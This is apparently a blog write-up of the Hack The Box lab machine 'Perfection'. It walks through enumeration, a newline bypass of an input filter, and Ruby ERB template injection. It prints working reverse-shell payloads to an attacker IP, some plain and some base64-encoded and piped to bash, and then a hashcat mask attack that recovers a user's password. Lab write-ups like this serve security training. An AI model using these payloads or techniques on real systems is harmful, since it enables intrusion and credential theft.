---
title:  HTB - Perfection
date: 2024-02-02 12:17:34 -0400
categories: [hackthebox , Perfection]
tags: [HackTheBox, SSTI, sudo, nmap, hashcat ]
image:
  path: /assets/img/post/perfection/Perfection.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hack the Box - Perfection.
---

## Box Info

| Name                  | Perfection       | 
| :-------------------- | ---------------: |
| Release Date          | 02 Mar, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## Enumeration

```bash
nmap -p- --open --min-rate 5000 -n -sS -vvv -Pn 10.10.11.253 -oG allPorts
nmap -sCV -p 22,80 10.10.11.253 -oN targeted
```

![Image](/assets/img/post/perfection/0.png)

#### Resolution DNS

```bash
echo "10.10.11.253 perfection.htb" | sudo tee -a /etc/hosts
```

#### Technology

```text
whatweb http://perfection.htb
```

![Image](/assets/img/post/perfection/1.png)

## Web

![Image](/assets/img/post/perfection/2.png)

The web is powered by WEBrick version 1.7.0, `WEBrick is a Ruby library providing simple HTTP web servers`{: filepath}

![Image](/assets/img/post/perfection/3.png)

Well, if you intercept the request u can see something like this `category1=literature` but if u try to this `category1=$` get a redirect with a text "Malicious text blocked".

We can do  with ffuf an scan for get a list of blocked characters.

```bash
ffuf -u http://10.10.11.253/weighted-grade-calc -d 'category1=FUZZ&grade1=90&weight1=30&category2=poop&grade2=100&weight2=50&category3=poop&grade3=100&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -mr Malicious
```

But what happens if a url encode the input?

```text
category1= poop%0aFUZZ &grade1=90&weight1=30&category2=poop&grade2=100&weight2=50&category3=poop&grade3=100&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -mr Malicious
```

`%0a`— represents a newline character, used to `bypass input validation`.

The first thing I think is that there may be an SSTI.
We go look to in payloadallthethings if there is something for ruby

[PaylaodsAllTheThings-Ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections)

![Image](/assets/img/post/perfection/pay.png)

`hURL` _to encode and decode payloads showcases the manipulation of data to exploit web application vulnerabilities. The payload crafted for the Weighted Grade Calculator application is designed to execute a reverse shell command, taking advantage of any potential server-side code execution vulnerabilities_

```shell
hURL -B "bash -i >& /dev/tcp/10.10.14.78/7777 0>&1" (base64)
```

```shell
hURL -U "{_stringbase64_}" (URLencoded)
```

![Image](/assets/img/post/perfection/5.png)

#### Payload
```text
category1=poop%0a<%25=system("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC40OC83Nzc3IDA%2BJjE%3D|+base64+-d+|+bash");%25>1
```

![Image](/assets/img/post/perfection/6.png)

Or use the payload `<%= IO.popen('id').readlines() %>` and urlencoded.

![Image](/assets/img/post/perfection/IO.png)

[Hacktricks-SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)

```bash
<%= IO.popen('bash -i >& /dev/tcp/10.10.14.78/7777 0>&1').readlines() %> 
```

![Image](/assets/img/post/perfection/7.png)

Enumerating found the file .db and got the credentials.

_A string is any sequence of 4 or more printable characters .db_

![Image](/assets/img/post/perfection/8.png)

## Privilege Escalation

![Image](/assets/img/post/perfection/9.png)

### Hashcat

```bash
hashcat -m 1400 hash.txt -a 3 "susan_nasus_?d?d?d?d?d?d?d?d"
```

![Image](/assets/img/post/perfection/10.png)

![Image](/assets/img/post/perfection/11.png)

```text
susan_nasus_413759210
```

![Image](/assets/img/post/perfection/12.png)

Root